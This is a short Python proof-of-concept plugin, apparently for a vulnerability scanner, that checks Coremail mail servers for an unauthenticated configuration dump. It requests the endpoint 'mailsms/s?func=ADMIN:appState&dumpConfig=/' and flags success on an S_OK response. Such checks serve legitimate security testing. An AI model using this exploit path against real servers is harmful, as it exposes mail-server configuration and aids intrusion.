#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: 'orleven'

from lib.utils.connect import ClientSession
from script import Script, SERVICE_PORT_MAP

class POC(Script):

    def __init__(self, target=None):
        self.service_type = SERVICE_PORT_MAP.COREMAIL
        self.name = 'coremail configure'
        self.keyword = ['coremail']
        self.info = 'Get the coremail configure'
        self.type = 'info'
        self.level = 'high'
        Script.__init__(self, target=target, service_type=self.service_type)

    async def prove(self):
        await self.get_url()
        if self.base_url:
            url = self.base_url + 'mailsms/s?func=ADMIN:appState&dumpConfig=/'
            async with ClientSession() as session:
                async with session.get(url=url) as res:
                    if res!=None:
                        text = await res.text()
                        if res.status != 404 and "<code>S_OK</code>" in text:
                            self.flag = 1
                            self.res.append({"info": url, "key": 'coremail configure'})
